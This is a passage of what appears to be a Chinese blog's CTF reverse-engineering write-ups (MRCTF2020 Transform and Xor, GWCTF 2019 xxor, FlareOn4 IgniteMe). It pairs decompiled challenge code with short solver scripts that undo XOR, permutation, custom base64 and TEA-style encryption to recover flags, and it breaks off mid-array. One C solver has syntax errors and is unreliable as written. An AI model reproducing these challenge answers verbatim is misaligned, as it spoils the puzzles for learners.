byte_40E0A0[<span class="number">4</span> * (*v12 &amp; <span class="number">0xF</span>)];</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_9:</span><br><span class="line">  *(_BYTE *)(v4 + a3) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> big_to_small((<span class="keyword">const</span> <span class="keyword">char</span> *)a3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>magic函数里面就是对base64置换表中从6-15进行的一个替换，从ida可以看出偏移是10</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.data:<span class="number">0040E0</span>A0 byte_40E0A0     db <span class="number">41</span>h                  ; DATA XREF: magic:loc_401005↑r</span><br><span class="line">.data:<span class="number">0040E0</span>A0                                         ; magic+<span class="number">17</span>↑w ...</span><br><span class="line">.data:<span class="number">0040E0</span>A1                 db  <span class="number">42</span>h ; B</span><br><span class="line">.data:<span class="number">0040E0</span>A2                 db  <span class="number">43</span>h ; C</span><br><span class="line">.data:<span class="number">0040E0</span>A3                 db  <span class="number">44</span>h ; D</span><br><span class="line">.data:<span class="number">0040E0</span>A4                 db  <span class="number">45</span>h ; E</span><br><span class="line">.data:<span class="number">0040E0</span>A5                 db  <span class="number">46</span>h ; F</span><br><span class="line">.data:<span class="number">0040E0</span>A6                 db  <span class="number">47</span>h ; G</span><br><span class="line">.data:<span class="number">0040E0</span>A7                 db  <span class="number">48</span>h ; H</span><br><span class="line">.data:<span class="number">0040E0</span>A8                 db  <span class="number">49</span>h ; I</span><br><span class="line">.data:<span class="number">0040E0</span>A9                 db  <span class="number">4</span>Ah ; J</span><br><span class="line">.data:<span class="number">0040E0</span>AA ; <span class="keyword">char</span> byte_40E0AA[]</span><br><span class="line">.data:<span class="number">0040E0</span>AA byte_40E0AA     db <span class="number">4B</span>h                  ; DATA XREF: magic+B↑r</span><br><span class="line">.data:<span class="number">0040E0</span>AA                                         ; magic+<span class="number">11</span>↑w</span><br><span class="line">.data:<span class="number">0040E0</span>AB aLmnopqrstuvwxy db <span class="string">&#x27;LMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>A0-AA刚好10个，然后最后的big_to_small就是个普通的大小写置换</p>
<p>其他中间一大串就是base64加密</p>
<p>我们捋下逆向思路，首先把加密结果给进行大小写转化，其次进行简单的temp操作得到魔改置换表，</p>
<p>接着通过魔改置换表和密文得到正常的base64，最后直接解base64</p>
<h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">secret = <span class="string">&#x27;zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9&#x27;</span>.swapcase() <span class="comment">#大小写转换</span></span><br><span class="line">a = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"><span class="built_in">dict</span> = &#123;&#125;</span><br><span class="line">offset = <span class="number">10</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">	<span class="built_in">dict</span>[a[i]]=a[i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>,<span class="number">15</span>):</span><br><span class="line">	b=<span class="built_in">dict</span>[a[i]]</span><br><span class="line">	<span class="built_in">dict</span>[a[i]]=<span class="built_in">dict</span>[a[i+offset]]</span><br><span class="line">	<span class="built_in">dict</span>[a[i+offset]]=b</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(secret)):</span><br><span class="line">    flag += <span class="built_in">dict</span>[secret[i]]</span><br><span class="line">flag = base64.b64decode(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="MRCTF2020-Transform"><a href="#MRCTF2020-Transform" class="headerlink" title="[MRCTF2020]Transform"></a>[MRCTF2020]Transform</h2><p>简单题，直接一把梭哈，就是ida7.5毛病真的是字符串提取贼麻烦</p>
<p>main</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> Str[<span class="number">104</span>]; <span class="comment">// [rsp+20h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_402230(argc, argv, envp);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me your code:\n&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Str);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(Str) != <span class="number">33</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Wrong!\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">32</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    enstr[i] = Str[key[i]];</span><br><span class="line">    enstr[i] ^= LOBYTE(key[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">32</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( flag[j] != enstr[j] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Wrong!\n&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Right!Good Job!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here is your flag: %s\n&quot;</span>, Str);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一步将加密结果保存为输入的字符串中密钥所表达的ASCII表代表的位置</p>
<p>第二步去和密钥异或，这样直接倒过来getflag</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = [<span class="number">0x9</span>, <span class="number">0x0A</span>, <span class="number">0x0F</span>, <span class="number">0x17</span>, <span class="number">0x7</span>, <span class="number">0x18</span>, <span class="number">0x0C</span>, <span class="number">0x6</span>, <span class="number">0x1</span>, <span class="number">0x10</span>, <span class="number">0x3</span>, <span class="number">0x11</span>, <span class="number">0x20</span>, <span class="number">0x1D</span>, <span class="number">0x0B</span>, <span class="number">0x1E</span>, <span class="number">0x1B</span>, <span class="number">0x16</span>, <span class="number">0x4</span>, <span class="number">0x0D</span>, <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x15</span>, <span class="number">0x2</span>, <span class="number">0x19</span>, <span class="number">0x5</span>, <span class="number">0x1F</span>, <span class="number">0x8</span>, <span class="number">0x12</span>, <span class="number">0x1A</span>, <span class="number">0x1C</span>, <span class="number">0x0E</span>, <span class="number">0</span>]</span><br><span class="line">enflag= [<span class="number">0x67</span>, <span class="number">0x79</span>, <span class="number">0x7B</span>, <span class="number">0x7F</span>, <span class="number">0x75</span>, <span class="number">0x2B</span>, <span class="number">0x3C</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x79</span>, <span class="number">0x57</span>, <span class="number">0x5E</span>, <span class="number">0x5D</span>, <span class="number">0x42</span>, <span class="number">0x7B</span>, <span class="number">0x2D</span>, <span class="number">0x2A</span>, <span class="number">0x66</span>, <span class="number">0x42</span>, <span class="number">0x7E</span>, <span class="number">0x4C</span>, <span class="number">0x57</span>, <span class="number">0x79</span>, <span class="number">0x41</span>, <span class="number">0x6B</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0x3C</span>, <span class="number">0x5C</span>, <span class="number">0x45</span>, <span class="number">0x6F</span>, <span class="number">0x62</span>, <span class="number">0x4D</span>]</span><br><span class="line">flag=[<span class="number">0</span>]*<span class="number">33</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">  enflag[i]^=key[i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">  flag[key[i]]=enflag[i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">  <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i]),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="GWCTF-2019-xxor"><a href="#GWCTF-2019-xxor" class="headerlink" title="[GWCTF 2019]xxor"></a>[GWCTF 2019]xxor</h2><p>看见这个题说来惭愧，自己出了道re难度偏难包含魔改凯撒，魔改rc4，魔改xtea算法，看见这里有tea算法就很激动，忽略了非常多的细节，还是要注意一点，<strong>逆向要有大局观！！！！！！！！！！！！</strong></p>
<p>我们来看看这个程序</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+Ch] [rbp-64h]</span></span><br><span class="line">  __int64 v6[<span class="number">6</span>]; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  __int64 v7[<span class="number">6</span>]; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v7[<span class="number">5</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let us play a game?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;you have six chances to input&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Come on!&quot;</span>);</span><br><span class="line">  v6[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v6[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v6[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v6[<span class="number">3</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v6[<span class="number">4</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;input: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, (<span class="keyword">char</span> *)v6 + <span class="number">4</span> * i);</span><br><span class="line">  &#125;</span><br><span class="line">  v7[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v7[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v7[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v7[<span class="number">3</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v7[<span class="number">4</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">2</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_601078 = v6[j];</span><br><span class="line">    dword_60107C = HIDWORD(v6[j]);</span><br><span class="line">    tea((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)&amp;dword_601078, dword_601060);</span><br><span class="line">    LODWORD(v7[j]) = dword_601078;</span><br><span class="line">    HIDWORD(v7[j]) = dword_60107C;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)confirm(v7) != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;NO NO NO~ &quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Congratulation!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You seccess half\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do not forget to change input to hex and combine~\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ByeBye&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我已经patch好了变量名，一目了然该干嘛干嘛，其实这题挺简单的，</p>
<p>我们先顺着来，输入明文，进行两次加密，其中每一次加密过程如下</p>
<p>取明文的下标j进行加密，其中601060存放的是密钥。</p>
<p>由此推测被加密的数据是明文的1，2。我们去康康这个tea算法怎么玩的。</p>
<p>tea</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">tea</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *a1, _DWORD *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v3 = *a1;</span><br><span class="line">  v4 = a1[<span class="number">1</span>];</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">63</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 += <span class="number">0x458BCD42</span>;</span><br><span class="line">    v3 += (v4 + v5 + <span class="number">11</span>) ^ ((v4 &lt;&lt; <span class="number">6</span>) + *a2) ^ ((v4 &gt;&gt; <span class="number">9</span>) + a2[<span class="number">1</span>]) ^ <span class="number">0x20</span>;</span><br><span class="line">    v4 += (v3 + v5 + <span class="number">20</span>) ^ ((v3 &lt;&lt; <span class="number">6</span>) + a2[<span class="number">2</span>]) ^ ((v3 &gt;&gt; <span class="number">9</span>) + a2[<span class="number">3</span>]) ^ <span class="number">0x10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = v3;</span><br><span class="line">  result = v4;</span><br><span class="line">  a1[<span class="number">1</span>] = v4;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关键点在for那，就是个tea算法。</p>
<p>我们去看confirm函数</p>
<p>confirm</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">confirm</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1[<span class="number">2</span>] - a1[<span class="number">3</span>] == <span class="number">2225223423LL</span></span><br><span class="line">    &amp;&amp; a1[<span class="number">3</span>] + a1[<span class="number">4</span>] == <span class="number">4201428739LL</span></span><br><span class="line">    &amp;&amp; a1[<span class="number">2</span>] - a1[<span class="number">4</span>] == <span class="number">1121399208LL</span></span><br><span class="line">    &amp;&amp; *a1 == <span class="number">3746099070</span></span><br><span class="line">    &amp;&amp; a1[<span class="number">5</span>] == <span class="number">2230518816</span></span><br><span class="line">    &amp;&amp; a1[<span class="number">1</span>] == <span class="number">550153460</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;good!&quot;</span>);</span><br><span class="line">    result = <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>加密后的数据全在这里了。</p>
<p>那么现在开始逆向分析推导</p>
<p>第一步进行逆向tea算法</p>
<p>第二步输出</p>
<p>这里的关键会在脚本中标注</p>
<h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> a1[]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    a1[<span class="number">0</span>]=<span class="number">0xDF48EF7E</span>;</span><br><span class="line">    a1[<span class="number">5</span>]=<span class="number">0x84F30420</span>;</span><br><span class="line">    a1[<span class="number">1</span>]=<span class="number">0x20CAACF4</span>;</span><br><span class="line">    a1[<span class="number">3</span>]=(<span class="number">0x42D731A8</span><span class="number">-0x84A236FF</span>+<span class="number">0xFA6CB703</span>)/<span class="number">2</span>;</span><br><span class="line">    a1[<span class="number">4</span>]=<span class="number">0xFA6CB703</span>-a1[<span class="number">3</span>];</span><br><span class="line">    a1[<span class="number">2</span>]=a1[<span class="number">3</span>]+<span class="number">0x84A236FF</span>;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> temp[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> data[<span class="number">4</span>] = &#123; <span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; =<span class="number">2</span>; ++<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> v3 = a1[i];</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> v4 = a1[i + <span class="number">1</span>];<span class="comment">/*v3，v4的值为什么是这个v3 = *a1;</span></span><br><span class="line"><span class="comment">  v4 = a1[1];从这两个在tea函数中的变量可知*/</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">long</span> <span class="keyword">long</span> v5 = <span class="number">0x458BCD42</span> * <span class="number">64</span>;<span class="comment">//总共加密了64次所以逆向的时候他其实是64倍</span></span><br><span class="line">		<span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">64</span>; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			v4 -= (v3 + v5 + <span class="number">20</span>) ^ ((v3 &lt;&lt; <span class="number">6</span>) + <span class="number">3</span>) ^ ((v3 &gt;&gt; <span class="number">9</span>) + <span class="number">4</span>) ^ <span class="number">0x10</span>;</span><br><span class="line">			v3 -= (v4 + v5 + <span class="number">11</span>) ^ ((v4 &lt;&lt; <span class="number">6</span>) + <span class="number">2</span>) ^ ((v4 &gt;&gt; <span class="number">9</span>) + <span class="number">2</span>) ^ <span class="number">0x20</span>;</span><br><span class="line">			v5 -= <span class="number">0x458BCD42</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		a1[i] = v3;</span><br><span class="line">		a1[i + <span class="number">1</span>] = v4;<span class="comment">//每次解密后让密文的值更改为明文。</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%c%c%c&quot;</span>, *((<span class="keyword">char</span>*)&amp;a1[i]+<span class="number">2</span>), *((<span class="keyword">char</span>*)&amp;a1[i] + <span class="number">1</span>), *(<span class="keyword">char</span>*)&amp;a1[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="MRCTF2020-Xor"><a href="#MRCTF2020-Xor" class="headerlink" title="[MRCTF2020]Xor"></a>[MRCTF2020]Xor</h2><p>easy</p>
<p>main</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>((<span class="keyword">int</span>)<span class="string">&quot;Give Me Your Flag String:\n&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, byte_4212C0);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(byte_4212C0) != <span class="number">27</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_6:</span><br><span class="line">    <span class="built_in">printf</span>((<span class="keyword">int</span>)<span class="string">&quot;Wrong!\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    _loaddll(<span class="number">0</span>);</span><br><span class="line">    __debugbreak();                            </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">27</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ((<span class="keyword">unsigned</span> __int8)i ^ (<span class="keyword">unsigned</span> __int8)byte_4212C0[i]) != byte_41EA08[i] )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>((<span class="keyword">int</span>)<span class="string">&quot;Right!\n&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接异或搞定</p>
<h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">en=<span class="string">&#x27;MSAWB~FXZ:J:`tQJ&quot;N@ bpdd&#125;8g&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(en)):</span><br><span class="line">	flag+=<span class="built_in">chr</span>(i^<span class="built_in">ord</span>(en[i]))</span><br><span class="line"><span class="built_in">print</span>((flag),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="FlareOn4-IgniteMe"><a href="#FlareOn4-IgniteMe" class="headerlink" title="[FlareOn4]IgniteMe"></a>[FlareOn4]IgniteMe</h2><p>好题目我很喜欢。又增强了我的逆向思维，以及win下的初次动调（其实献给了IOT）</p>
<p>main</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  DWORD NumberOfBytesWritten; <span class="comment">// [esp+0h] [ebp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  NumberOfBytesWritten = <span class="number">0</span>;</span><br><span class="line">  hFile = GetStdHandle(<span class="number">0xFFFFFFF6</span>);</span><br><span class="line">  dword_403074 = GetStdHandle(<span class="number">0xFFFFFFF5</span>);</span><br><span class="line">  WriteFile(dword_403074, giveme, <span class="number">0x13</span>u, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">  sub_4010F0(NumberOfBytesWritten);</span><br><span class="line">  <span class="keyword">if</span> ( en() )</span><br><span class="line">    WriteFile(dword_403074, aG00dJ0b, <span class="number">0xA</span>u, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    WriteFile(dword_403074, aN0tT00H0tRWe7r, <span class="number">0x24</span>u, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">  ExitProcess(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没什么好说的直接单刀直入加密函数en</p>
<p>en</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_401050</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+0h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+4h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [esp+4h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+Bh] [ebp-1h]</span></span><br><span class="line"></span><br><span class="line">  v1 = sub_401020((<span class="keyword">int</span>)byte_403078);</span><br><span class="line">  v4 = sub_401000();</span><br><span class="line">  <span class="keyword">for</span> ( i = v1 - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    byte_403180[i] = v4 ^ byte_403078[i];</span><br><span class="line">    v4 = byte_403078[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">39</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( byte_403180[j] != (<span class="keyword">unsigned</span> __int8)byte_403000[j] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>403180作为我们的一个密文保存，403078是明文的输入保存，虽然从程序来看，v1好像是无限的其实我们看下面就知道</p>
<p>真实的值是39，继续看那个v4(大病，忘记了可以动态调试看内存，pwn玩的熟悉的东西反而没带过来，惭愧)</p>
<p>我们在汇编</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0040106B</span>                 mov     [ebp+var_1], al</span><br></pre></td></tr></table></figure>

<p>此处下断点，var_1就是v4不懂汇编的自己回去补去</p>
<p>结果发现是4。</p>
<h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">arr2 = [<span class="number">0x0D</span>,<span class="number">0x26</span>,<span class="number">0x49</span>,<span class="number">0x45</span>,<span class="number">0x2A</span>,<span class="number">0x17</span>,<span class="number">0x78</span>,<span class="number">0x44</span>,<span class="number">0x2B</span>,<span class="number">0x6C</span>,<span class="number">0x5D</span>,<span class="number">0x5E</span>,<span class="number">0x45</span>,<span class="number">0x12</span>,<span class="number">0x2F</span>,<span class="number">0x17</span>,</span><br><span class="line"><span class="number">0x2B</span>,<span class="number">0x44</span>,<span class="number">0x6F</span>,<span class="number">0x6E</span>,<span class="number">0x56</span>,<span class="number">0x09</span>,<span class="number">0x5F</span>,<span class="number">0x45</span>,<span class="number">0x47</span>,<span class="number">0x73</span>,<span class="number">0x26</span>,<span class="number">0x0A</span>,<span class="number">0x0D</span>,<span class="number">0x13</span>,<span class="number">0x17</span>,<span class="number">0x48</span>,</span><br><span class="line"><span class="number">0x42</span>,<span class="number">0x01</span>,<span class="number">0x40</span>,<span class="number">0x4D</span>,<span 